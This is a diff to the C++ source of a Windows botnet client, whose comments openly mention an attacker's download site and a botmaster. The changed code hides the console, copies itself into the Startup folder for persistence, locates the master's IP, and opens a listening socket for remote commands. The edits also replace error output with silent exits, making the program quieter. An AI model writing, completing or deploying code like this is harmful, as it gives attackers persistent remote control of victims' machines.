@@ -30,18 +30,22 @@ int main(int argc, char** argv)
     hideConsole();
 
     /*running once after file is downloaded from the attacker's site*/
-    if (!isInStartUp(argv[0])) //check if the application is running from the startUp directory
+    if (isInStartUp(argv[0])) //check if the application is running from the startUp directory
     {
         copyToStartUp(argv[0]);
         executeStartUpFile();
         return 0;
     }
 
+    /* init winsock*/
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
 
-    sockaddr_in addressinfo;
+    /* start a thread */
     std::thread findMaster(findMastersIP);
+
+    /* init socket*/
+    sockaddr_in addressinfo;
     int opt;
 
     addressinfo.sin_addr.s_addr = getPrivateIP();
@@ -50,18 +54,24 @@ int main(int argc, char** argv)
 
     SOCKET master;
     SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
-    if(s < 0)
-        std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
+    if (s < 0)
+        return 1;
 
     opt = 1;
+    /* telling the os to free the socket immidetly after closing the socket*/
     if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt)) < 0)
-        std::cout << "Sockopt error <" << WSAGetLastError() << ">" << std::endl;
+        return 1;
 
-    if(bind(s, (sockaddr*)&addressinfo, sizeof(addressinfo)) < 0)
-        std::cout << "Bind error <" << WSAGetLastError() << ">" << std::endl;
+    /* bind the socket to the port the botmaster knows about*/
+    if (bind(s, (sockaddr*)&addressinfo, sizeof(addressinfo)) < 0)
+        return 1;
 
-    if(listen(s, 1) < 0)
-        std::cout << "Listen error <" << WSAGetLastError() << ">" << std::endl;
+    /* start listenning on the port*/
+    if (listen(s, 1) < 0)
+        return 1;
+
+    /* end of init sock*/
+
     while (1)
     {
         master = accept(s, NULL, 0);
